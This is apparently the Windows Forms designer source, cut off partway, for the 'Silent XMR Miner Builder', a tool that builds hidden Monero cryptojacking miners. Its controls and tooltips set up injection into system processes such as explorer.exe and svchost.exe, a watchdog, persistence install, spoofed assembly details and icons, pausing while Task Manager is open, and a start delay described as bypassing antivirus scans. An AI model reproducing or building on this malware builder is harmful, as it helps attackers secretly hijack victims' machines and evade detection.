<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.TooltipHelper = New System.Windows.Forms.ToolTip(Me.components)
        Me.helpLabelPassword = New System.Windows.Forms.Label()
        Me.helpLabelWallet = New System.Windows.Forms.Label()
        Me.helpLabelPool = New System.Windows.Forms.Label()
        Me.Label36 = New System.Windows.Forms.Label()
        Me.Label32 = New System.Windows.Forms.Label()
        Me.Label31 = New System.Windows.Forms.Label()
        Me.helpLabelInstall = New System.Windows.Forms.Label()
        Me.Label35 = New System.Windows.Forms.Label()
        Me.Label26 = New System.Windows.Forms.Label()
        Me.Label25 = New System.Windows.Forms.Label()
        Me.Label21 = New System.Windows.Forms.Label()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.Label15 = New System.Windows.Forms.Label()
        Me.Label14 = New System.Windows.Forms.Label()
        Me.helpLabelEnableCPU = New System.Windows.Forms.Label()
        Me.helpLabelMaxCPU = New System.Windows.Forms.Label()
        Me.Label28 = New System.Windows.Forms.Label()
        Me.MephForm1 = New SilentXMRMiner.MephTheme()
        Me.MephTabcontrol2 = New SilentXMRMiner.MephTabcontrol()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.txtInjection = New SilentXMRMiner.MephComboBox()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.txtPoolUsername = New SilentXMRMiner.MephTextBox()
        Me.txtPoolURL = New SilentXMRMiner.MephTextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.txtPoolPassowrd = New SilentXMRMiner.MephTextBox()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.Label37 = New System.Windows.Forms.Label()
        Me.toggleWatchdog = New SilentXMRMiner.MephToggleSwitch()
        Me.chkInstall = New SilentXMRMiner.MephCheckBox()
        Me.txtInstallFileName = New SilentXMRMiner.MephTextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.txtInstallPathMain = New SilentXMRMiner.MephComboBox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.chkAssembly = New SilentXMRMiner.MephCheckBox()
        Me.btn_assemblyRandom = New SilentXMRMiner.MephButton()
        Me.txtTitle = New SilentXMRMiner.MephTextBox()
        Me.btn_assemblyClone = New SilentXMRMiner.MephButton()
        Me.txtProduct = New SilentXMRMiner.MephTextBox()
        Me.num_Assembly4 = New SilentXMRMiner.MephTextBox()
        Me.txtDescription = New SilentXMRMiner.MephTextBox()
        Me.num_Assembly3 = New SilentXMRMiner.MephTextBox()
        Me.txtCopyright = New SilentXMRMiner.MephTextBox()
        Me.num_Assembly2 = New SilentXMRMiner.MephTextBox()
        Me.txtCompany = New SilentXMRMiner.MephTextBox()
        Me.num_Assembly1 = New SilentXMRMiner.MephTextBox()
        Me.txtTrademark = New SilentXMRMiner.MephTextBox()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.chkIcon = New SilentXMRMiner.MephCheckBox()
        Me.picIcon = New System.Windows.Forms.PictureBox()
        Me.btnBrowseIcon = New SilentXMRMiner.MephButton()
        Me.txtIconPath = New SilentXMRMiner.MephTextBox()
        Me.TabPage6 = New System.Windows.Forms.TabPage()
        Me.MephButton1 = New SilentXMRMiner.MephButton()
        Me.Label27 = New System.Windows.Forms.Label()
        Me.toggleEnableStealth = New SilentXMRMiner.MephToggleSwitch()
        Me.Label24 = New System.Windows.Forms.Label()
        Me.Label23 = New System.Windows.Forms.Label()
        Me.txtIdleWait = New SilentXMRMiner.MephTextBox()
        Me.txtIdleCPU = New SilentXMRMiner.MephComboBox()
        Me.Label22 = New System.Windows.Forms.Label()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.toggleSSLTLS = New SilentXMRMiner.MephToggleSwitch()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.toggleEnableCPU = New SilentXMRMiner.MephToggleSwitch()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.toggleEnableNicehash = New SilentXMRMiner.MephToggleSwitch()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.toggleEnableIdle = New SilentXMRMiner.MephToggleSwitch()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.toggleEnableGPU = New SilentXMRMiner.MephToggleSwitch()
        Me.txtMaxCPU = New SilentXMRMiner.MephComboBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.Label29 = New System.Windows.Forms.Label()
        Me.Label30 = New System.Windows.Forms.Label()
        Me.txtStartDelay = New SilentXMRMiner.MephTextBox()
        Me.labelHackforums = New System.Windows.Forms.LinkLabel()
        Me.labelGitHub = New System.Windows.Forms.LinkLabel()
        Me.txtLog = New SilentXMRMiner.MephTextBox()
        Me.btnBuild = New SilentXMRMiner.MephButton()
        Me.MephForm1.SuspendLayout()
        Me.MephTabcontrol2.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        CType(Me.picIcon, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage6.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        Me.SuspendLayout()
        '
        'BackgroundWorker1
        '
        '
        'BackgroundWorker2
        '
        '
        'TooltipHelper
        '
        Me.TooltipHelper.AutoPopDelay = 32000
        Me.TooltipHelper.BackColor = System.Drawing.Color.White
        Me.TooltipHelper.ForeColor = System.Drawing.Color.Black
        Me.TooltipHelper.InitialDelay = 100
        Me.TooltipHelper.IsBalloon = True
        Me.TooltipHelper.ReshowDelay = 100
        '
        'helpLabelPassword
        '
        Me.helpLabelPassword.AutoSize = True
        Me.helpLabelPassword.Cursor = System.Windows.Forms.Cursors.Help
        Me.helpLabelPassword.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.helpLabelPassword.ForeColor = System.Drawing.Color.Teal
        Me.helpLabelPassword.Location = New System.Drawing.Point(392, 105)
        Me.helpLabelPassword.Name = "helpLabelPassword"
        Me.helpLabelPassword.Size = New System.Drawing.Size(13, 13)
        Me.helpLabelPassword.TabIndex = 39
        Me.helpLabelPassword.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.helpLabelPassword, "The password to connect with. On many pools you should leave this blank but on so" &
        "me they require you to put some password here or as in the case of SupportXMR yo" &
        "u should put your Worker name here.")
        '
        'helpLabelWallet
        '
        Me.helpLabelWallet.AutoSize = True
        Me.helpLabelWallet.Cursor = System.Windows.Forms.Cursors.Help
        Me.helpLabelWallet.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.helpLabelWallet.ForeColor = System.Drawing.Color.Teal
        Me.helpLabelWallet.Location = New System.Drawing.Point(392, 59)
        Me.helpLabelWallet.Name = "helpLabelWallet"
        Me.helpLabelWallet.Size = New System.Drawing.Size(13, 13)
        Me.helpLabelWallet.TabIndex = 38
        Me.helpLabelWallet.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.helpLabelWallet, resources.GetString("helpLabelWallet.ToolTip"))
        '
        'helpLabelPool
        '
        Me.helpLabelPool.AutoSize = True
        Me.helpLabelPool.Cursor = System.Windows.Forms.Cursors.Help
        Me.helpLabelPool.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.helpLabelPool.ForeColor = System.Drawing.Color.Teal
        Me.helpLabelPool.Location = New System.Drawing.Point(392, 11)
        Me.helpLabelPool.Name = "helpLabelPool"
        Me.helpLabelPool.Size = New System.Drawing.Size(13, 13)
        Me.helpLabelPool.TabIndex = 37
        Me.helpLabelPool.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.helpLabelPool, "The pool to mine to. Pool address is formatted as such: ADDRESS:PORT. (Example: x" &
        "mr.examplepool.com:8080)")
        '
        'Label36
        '
        Me.Label36.AutoSize = True
        Me.Label36.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label36.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label36.ForeColor = System.Drawing.Color.Teal
        Me.Label36.Location = New System.Drawing.Point(135, 114)
        Me.Label36.Name = "Label36"
        Me.Label36.Size = New System.Drawing.Size(13, 13)
        Me.Label36.TabIndex = 46
        Me.Label36.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label36, resources.GetString("Label36.ToolTip"))
        '
        'Label32
        '
        Me.Label32.AutoSize = True
        Me.Label32.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label32.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label32.ForeColor = System.Drawing.Color.Teal
        Me.Label32.Location = New System.Drawing.Point(212, 81)
        Me.Label32.Name = "Label32"
        Me.Label32.Size = New System.Drawing.Size(13, 13)
        Me.Label32.TabIndex = 40
        Me.Label32.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners filename, this filename will show up in places like the Task" &
        " Manager autostart window.")
        '
        'Label31
        '
        Me.Label31.AutoSize = True
        Me.Label31.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label31.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label31.ForeColor = System.Drawing.Color.Teal
        Me.Label31.Location = New System.Drawing.Point(211, 47)
        Me.Label31.Name = "Label31"
        Me.Label31.Size = New System.Drawing.Size(13, 13)
        Me.Label31.TabIndex = 39
        Me.Label31.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label31, "The location to save the Installed miner.")
        '
        'helpLabelInstall
        '
        Me.helpLabelInstall.AutoSize = True
        Me.helpLabelInstall.Cursor = System.Windows.Forms.Cursors.Help
        Me.helpLabelInstall.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.helpLabelInstall.ForeColor = System.Drawing.Color.Teal
        Me.helpLabelInstall.Location = New System.Drawing.Point(101, 16)
        Me.helpLabelInstall.Name = "helpLabelInstall"
        Me.helpLabelInstall.Size = New System.Drawing.Size(13, 13)
        Me.helpLabelInstall.TabIndex = 38
        Me.helpLabelInstall.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.helpLabelInstall, resources.GetString("helpLabelInstall.ToolTip"))
        '
        'Label35
        '
        Me.Label35.AutoSize = True
        Me.Label35.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label35.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label35.ForeColor = System.Drawing.Color.Teal
        Me.Label35.Location = New System.Drawing.Point(101, 16)
        Me.Label35.Name = "Label35"
        Me.Label35.Size = New System.Drawing.Size(13, 13)
        Me.Label35.TabIndex = 39
        Me.Label35.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label35, "The assembly information of the file, this information will also show up in the T" &
        "ask Manager and its autostart section if you have ""Install"" enabled.")
        '
        'Label26
        '
        Me.Label26.AutoSize = True
        Me.Label26.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label26.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label26.ForeColor = System.Drawing.Color.Teal
        Me.Label26.Location = New System.Drawing.Point(176, 150)
        Me.Label26.Name = "Label26"
        Me.Label26.Size = New System.Drawing.Size(13, 13)
        Me.Label26.TabIndex = 57
        Me.Label26.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label26, "If enabled it will currently pause the miner while Task Manager is open.")
        '
        'Label25
        '
        Me.Label25.AutoSize = True
        Me.Label25.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label25.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label25.ForeColor = System.Drawing.Color.Teal
        Me.Label25.Location = New System.Drawing.Point(405, 71)
        Me.Label25.Name = "Label25"
        Me.Label25.Size = New System.Drawing.Size(13, 13)
        Me.Label25.TabIndex = 54
        Me.Label25.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label25, "The amount of time to wait before activating idle mode.")
        '
        'Label21
        '
        Me.Label21.AutoSize = True
        Me.Label21.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label21.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label21.ForeColor = System.Drawing.Color.Teal
        Me.Label21.Location = New System.Drawing.Point(393, 43)
        Me.Label21.Name = "Label21"
        Me.Label21.Size = New System.Drawing.Size(13, 13)
        Me.Label21.TabIndex = 50
        Me.Label21.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label21, "The amount of CPU the miner should use while the computer is idle.")
        '
        'Label17
        '
        Me.Label17.AutoSize = True
        Me.Label17.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label17.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label17.ForeColor = System.Drawing.Color.Teal
        Me.Label17.Location = New System.Drawing.Point(175, 95)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(13, 13)
        Me.Label17.TabIndex = 43
        Me.Label17.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label17, "SSL/TLS increases performance and stability but only works on some pools, check t" &
        "he pool you're using the see if it supports it. Most pools use a different port " &
        "for SSL/TLS.")
        '
        'Label16
        '
        Me.Label16.AutoSize = True
        Me.Label16.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label16.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label16.ForeColor = System.Drawing.Color.Teal
        Me.Label16.Location = New System.Drawing.Point(176, 123)
        Me.Label16.Name = "Label16"
        Me.Label16.Size = New System.Drawing.Size(13, 13)
        Me.Label16.TabIndex = 40
        Me.Label16.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label16, "Only enable if mining to nicehash.com or using something like xmrig-proxy where t" &
        "he jobs needs to be split into multiple sub jobs.")
        '
        'Label15
        '
        Me.Label15.AutoSize = True
        Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label15.ForeColor = System.Drawing.Color.Teal
        Me.Label15.Location = New System.Drawing.Point(175, 68)
        Me.Label15.Name = "Label15"
        Me.Label15.Size = New System.Drawing.Size(13, 13)
        Me.Label15.TabIndex = 39
        Me.Label15.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label15, resources.GetString("Label15.ToolTip"))
        '
        'Label14
        '
        Me.Label14.AutoSize = True
        Me.Label14.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label14.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label14.ForeColor = System.Drawing.Color.Teal
        Me.Label14.Location = New System.Drawing.Point(175, 41)
        Me.Label14.Name = "Label14"
        Me.Label14.Size = New System.Drawing.Size(13, 13)
        Me.Label14.TabIndex = 38
        Me.Label14.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label14, "GPU Mining gives better performance but is easier to detect and greatly increases" &
        " the miner file size.")
        '
        'helpLabelEnableCPU
        '
        Me.helpLabelEnableCPU.AutoSize = True
        Me.helpLabelEnableCPU.Cursor = System.Windows.Forms.Cursors.Help
        Me.helpLabelEnableCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.helpLabelEnableCPU.ForeColor = System.Drawing.Color.Teal
        Me.helpLabelEnableCPU.Location = New System.Drawing.Point(175, 14)
        Me.helpLabelEnableCPU.Name = "helpLabelEnableCPU"
        Me.helpLabelEnableCPU.Size = New System.Drawing.Size(13, 13)
        Me.helpLabelEnableCPU.TabIndex = 37
        Me.helpLabelEnableCPU.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.helpLabelEnableCPU, "Enables mining on the CPU.")
        '
        'helpLabelMaxCPU
        '
        Me.helpLabelMaxCPU.AutoSize = True
        Me.helpLabelMaxCPU.Cursor = System.Windows.Forms.Cursors.Help
        Me.helpLabelMaxCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.helpLabelMaxCPU.ForeColor = System.Drawing.Color.Teal
        Me.helpLabelMaxCPU.Location = New System.Drawing.Point(393, 14)
        Me.helpLabelMaxCPU.Name = "helpLabelMaxCPU"
        Me.helpLabelMaxCPU.Size = New System.Drawing.Size(13, 13)
        Me.helpLabelMaxCPU.TabIndex = 36
        Me.helpLabelMaxCPU.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.helpLabelMaxCPU, "The max amount of CPU the miner should use.")
        '
        'Label28
        '
        Me.Label28.AutoSize = True
        Me.Label28.Cursor = System.Windows.Forms.Cursors.Help
        Me.Label28.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
        Me.Label28.ForeColor = System.Drawing.Color.Teal
        Me.Label28.Location = New System.Drawing.Point(178, 13)
        Me.Label28.Name = "Label28"
        Me.Label28.Size = New System.Drawing.Size(13, 13)
        Me.Label28.TabIndex = 58
        Me.Label28.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" &
        "virus scans!")
        '
        'MephForm1
        '
        Me.MephForm1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.MephForm1.Anchor = System.Windows.Forms.AnchorStyles.None
        Me.MephForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer))
        Me.MephForm1.Controls.Add(Me.MephTabcontrol2)
        Me.MephForm1.Font = New System.Drawing.Font("Segoe UI", 8.59375!)
        Me.MephForm1.ForeColor = System.Drawing.Color.Gray
        Me.MephForm1.Location = New System.Drawing.Point(0, 0)
        Me.MephForm1.Margin = New System.Windows.Forms.Padding(2)
        Me.MephForm1.MaximumSize = New System.Drawing.Size(535, 272)
        Me.MephForm1.MinimumSize = New System.Drawing.Size(535, 272)
        Me.MephForm1.Name = "MephForm1"
        Me.MephForm1.Size = New System.Drawing.Size(535, 272)
        Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
        Me.MephForm1.TabIndex = 0
        Me.MephForm1.Text = "Silent XMR Miner Builder 1.2.3"
        '
        'MephTabcontrol2
        '
        Me.MephTabcontrol2.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.MephTabcontrol2.Anchor = System.Windows.Forms.AnchorStyles.None
        Me.MephTabcontrol2.Controls.Add(Me.TabPage1)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage2)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage3)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage4)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage6)
        Me.MephTabcontrol2.Controls.Add(Me.TabPage5)
        Me.MephTabcontrol2.ItemSize = New System.Drawing.Size(32, 85)
        Me.MephTabcontrol2.Location = New System.Drawing.Point(12, 65)
        Me.MephTabcontrol2.Multiline = True
        Me.MephTabcontrol2.Name = "MephTabcontrol2"
        Me.MephTabcontrol2.SelectedIndex = 0
        Me.MephTabcontrol2.Size = New System.Drawing.Size(511, 197)
        Me.MephTabcontrol2.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.MephTabcontrol2.TabIndex = 17
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.helpLabelPassword)
        Me.TabPage1.Controls.Add(Me.helpLabelWallet)
        Me.TabPage1.Controls.Add(Me.helpLabelPool)
        Me.TabPage1.Controls.Add(Me.Label5)
        Me.TabPage1.Controls.Add(Me.txtInjection)
        Me.TabPage1.Controls.Add(Me.Label10)
        Me.TabPage1.Controls.Add(Me.Label8)
        Me.TabPage1.Controls.Add(Me.txtPoolUsername)
        Me.TabPage1.Controls.Add(Me.txtPoolURL)
        Me.TabPage1.Controls.Add(Me.Label6)
        Me.TabPage1.Controls.Add(Me.Label7)
        Me.TabPage1.Controls.Add(Me.txtPoolPassowrd)
        Me.TabPage1.Location = New System.Drawing.Point(89, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Size = New System.Drawing.Size(418, 189)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Main"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(8, 158)
        Me.Label5.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(63, 15)
        Me.Label5.TabIndex = 19
        Me.Label5.Text = "Inject Into:"
        '
        'txtInjection
        '
        Me.txtInjection.BackColor = System.Drawing.Color.Transparent
        Me.txtInjection.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtInjection.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.txtInjection.ForeColor = System.Drawing.Color.Silver
        Me.txtInjection.FormattingEnabled = True
        Me.txtInjection.ItemHeight = 16
        Me.txtInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
        Me.txtInjection.Items.AddRange(New Object() {"explorer.exe (%WINDIR%)", "nslookup.exe (%WINDIR%/System32)", "cmd.exe (%WINDIR%/System32)", "notepad.exe (%WINDIR%/System32)", "svchost.exe (%WINDIR%/System32)", "conhost.exe (%WINDIR%/System32)"})
        Me.txtInjection.Location = New System.Drawing.Point(79, 156)
        Me.txtInjection.Margin = New System.Windows.Forms.Padding(2)
        Me.txtInjection.Name = "txtInjection"
        Me.txtInjection.Size = New System.Drawing.Size(327, 22)
        Me.txtInjection.StartIndex = 0
        Me.txtInjection.TabIndex = 18
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Location = New System.Drawing.Point(176, 8)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(201, 15)
        Me.Label10.TabIndex = 16
        Me.Label10.Text = "(Example: xmr.examplepool.com:80)"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(8, 8)
        Me.Label8.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(34, 15)
        Me.Label8.TabIndex = 15
        Me.Label8.Text = "Pool:"
        '
        'txtPoolUsername
        '
        Me.txtPoolUsername.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtPoolUsername.ForeColor = System.Drawing.Color.Silver
        Me.txtPoolUsername.Location = New System.Drawing.Point(11, 77)
        Me.txtPoolUsername.Margin = New System.Windows.Forms.Padding(2)
        Me.txtPoolUsername.MaxLength = 32767
        Me.txtPoolUsername.MultiLine = False
        Me.txtPoolUsername.Name = "txtPoolUsername"
        Me.txtPoolUsername.Size = New System.Drawing.Size(395, 24)
        Me.txtPoolUsername.TabIndex = 10
        Me.txtPoolUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolUsername.UseSystemPasswordChar = False
        Me.txtPoolUsername.WordWrap = False
        '
        'txtPoolURL
        '
        Me.txtPoolURL.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtPoolURL.ForeColor = System.Drawing.Color.Silver
        Me.txtPoolURL.Location = New System.Drawing.Point(12, 29)
        Me.txtPoolURL.Margin = New System.Windows.Forms.Padding(2)
        Me.txtPoolURL.MaxLength = 32767
        Me.txtPoolURL.MultiLine = False
        Me.txtPoolURL.Name = "txtPoolURL"
        Me.txtPoolURL.Size = New System.Drawing.Size(394, 24)
        Me.txtPoolURL.TabIndex = 14
        Me.txtPoolURL.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolURL.UseSystemPasswordChar = False
        Me.txtPoolURL.WordWrap = False
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(9, 55)
        Me.Label6.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(116, 15)
        Me.Label6.TabIndex = 11
        Me.Label6.Text = "Wallet Address/User:"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(9, 102)
        Me.Label7.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(122, 15)
        Me.Label7.TabIndex = 13
        Me.Label7.Text = "Password (if required)"
        '
        'txtPoolPassowrd
        '
        Me.txtPoolPassowrd.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtPoolPassowrd.ForeColor = System.Drawing.Color.Silver
        Me.txtPoolPassowrd.Location = New System.Drawing.Point(12, 122)
        Me.txtPoolPassowrd.Margin = New System.Windows.Forms.Padding(2)
        Me.txtPoolPassowrd.MaxLength = 32767
        Me.txtPoolPassowrd.MultiLine = False
        Me.txtPoolPassowrd.Name = "txtPoolPassowrd"
        Me.txtPoolPassowrd.Size = New System.Drawing.Size(394, 24)
        Me.txtPoolPassowrd.TabIndex = 12
        Me.txtPoolPassowrd.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolPassowrd.UseSystemPasswordChar = False
        Me.txtPoolPassowrd.WordWrap = False
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.Label36)
        Me.TabPage2.Controls.Add(Me.Label37)
        Me.TabPage2.Controls.Add(Me.toggleWatchdog)
        Me.TabPage2.Controls.Add(Me.Label32)
        Me.TabPage2.Controls.Add(Me.Label31)
        Me.TabPage2.Controls.Add(Me.helpLabelInstall)
        Me.TabPage2.Controls.Add(Me.chkInstall)
        Me.TabPage2.Controls.Add(Me.txtInstallFileName)
        Me.TabPage2.Controls.Add(Me.Label2)
        Me.TabPage2.Controls.Add(Me.Label1)
        Me.TabPage2.Controls.Add(Me.txtInstallPathMain)
        Me.TabPage2.Location = New System.Drawing.Point(89, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Size = New System.Drawing.Size(418, 189)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Install"
        '
        'Label37
        '
        Me.Label37.AutoSize = True
        Me.Label37.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label37.Location = New System.Drawing.Point(9, 111)
        Me.Label37.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label37.Name = "Label37"
        Me.Label37.Size = New System.Drawing.Size(70, 17)
        Me.Label37.TabIndex = 45
        Me.Label37.Text = "Watchdog:"
        '
        'toggleWatchdog
        '
        Me.toggleWatchdog.BackColor = System.Drawing.Color.Transparent
        Me.toggleWatchdog.Checked = True
        Me.toggleWatchdog.ForeColor = System.Drawing.Color.Black
        Me.toggleWatchdog.Location = New System.Drawing.Point(81, 109)
        Me.toggleWatchdog.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleWatchdog.Name = "toggleWatchdog"
        Me.toggleWatchdog.Size = New System.Drawing.Size(50, 24)
        Me.toggleWatchdog.TabIndex = 44
        Me.toggleWatchdog.Text = "Enable GPU Mining"
        '
        'chkInstall
        '
        Me.chkInstall.AccentColor = System.Drawing.Color.ForestGreen
        Me.chkInstall.BackColor = System.Drawing.Color.Transparent
        Me.chkInstall.Checked = False
        Me.chkInstall.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkInstall.ForeColor = System.Drawing.Color.Black
        Me.chkInstall.Location = New System.Drawing.Point(14, 12)
